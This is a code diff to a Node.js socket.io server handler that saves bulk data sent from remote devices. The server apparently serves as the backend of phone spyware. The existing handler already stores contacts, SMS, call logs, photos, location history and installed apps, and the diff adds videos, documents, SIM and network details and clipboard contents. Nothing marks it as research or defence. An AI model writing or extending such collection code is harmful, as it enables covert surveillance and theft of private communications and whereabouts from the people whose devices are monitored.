@@ -234,18 +234,41 @@ io.on('connection', async (socket) => {
       socket.on('device:data:bulk', async (data) => {
         try {
           const updateFields = {};
-          if (data.contacts) updateFields['data.contacts'] = data.contacts;
-          if (data.sms) updateFields['data.sms'] = data.sms;
-          if (data.callLogs) updateFields['data.callLogs'] = data.callLogs;
-          if (data.photos) updateFields['data.photos'] = data.photos;
+          
+          // Helper to extract array from wrapped objects like {"contacts": [...]}
+          const extractArray = (val) => {
+            if (Array.isArray(val)) return val;
+            if (typeof val === 'object' && val !== null) {
+              // Check for wrapped format: {"contacts": [...]} or {"sms": [...]}
+              const keys = Object.keys(val);
+              if (keys.length === 1 && Array.isArray(val[keys[0]])) {
+                return val[keys[0]];
+              }
+            }
+            return val;
+          };
+          
+          if (data.contacts) updateFields['data.contacts'] = extractArray(data.contacts);
+          if (data.sms) {
+            const smsArray = extractArray(data.sms);
+            updateFields['data.sms'] = smsArray;
+          }
+          if (data.callLogs) updateFields['data.callLogs'] = extractArray(data.callLogs);
+          if (data.photos) updateFields['data.photos'] = extractArray(data.photos);
+          if (data.videos) updateFields['data.videos'] = extractArray(data.videos);
+          if (data.documents) updateFields['data.documents'] = extractArray(data.documents);
           if (data.location) {
             updateFields['$push'] = { 'data.locations': {
               ...data.location,
               timestamp: new Date()
             }};
           }
-          if (data.installedApps) updateFields['data.installedApps'] = data.installedApps;
+          if (data.installedApps) updateFields['data.installedApps'] = extractArray(data.installedApps);
           if (data.deviceInfo) updateFields['data.deviceInfo'] = data.deviceInfo;
+          if (data.battery) updateFields['data.battery'] = data.battery;
+          if (data.simInfo) updateFields['data.simInfo'] = data.simInfo;
+          if (data.networkInfo) updateFields['data.networkInfo'] = data.networkInfo;
+          if (data.clipboard) updateFields['data.clipboard'] = data.clipboard;
           
           await Device.findOneAndUpdate(
             { deviceId: socket.deviceId },
